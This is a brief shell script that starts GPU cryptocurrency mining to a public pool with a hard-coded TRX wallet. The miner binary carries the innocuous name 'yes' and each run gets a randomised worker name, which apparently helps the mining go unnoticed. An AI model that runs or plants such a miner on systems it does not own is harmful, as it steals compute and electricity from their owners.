POOL=rx-us.unmineable.com:3333
WALLET=TRX:TPt7sudGbF7fjLLaX4dR5xFahio6LgwMGp
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo zYN4TeHr-$(shuf -i 1911-784432 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
